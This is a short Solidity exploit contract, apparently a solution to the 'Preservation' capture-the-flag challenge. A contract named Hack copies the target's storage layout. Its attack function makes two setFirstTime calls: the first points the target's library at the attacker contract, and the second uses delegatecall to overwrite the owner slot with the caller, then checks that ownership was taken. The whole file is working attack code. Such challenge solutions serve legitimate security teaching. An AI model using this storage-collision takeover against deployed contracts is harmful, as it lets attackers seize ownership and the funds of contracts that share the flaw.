pragma solidity ^0.8;

interface IPreservation {
  function owner() external view returns (address);
  function setFirstTime(uint) external;
}

contract Hack {
  // Align storage layout same as Preservation
  address public timeZone1Library;
  address public timeZone2Library;
  address public owner;

  function attack(IPreservation target) external {
    // set library to this contract
    target.setFirstTime(uint(uint160(address(this))));
    // call setFirstTime to execute code inside this contract and update owner state variable
    // To pass this challenge, new owner must be the player (msg.sender)
    target.setFirstTime(uint(uint160(msg.sender)));
    require(target.owner() == msg.sender, "hack failed");
  }

  function setTime(uint _owner) public {
    owner = address(uint160(_owner));
  }
}
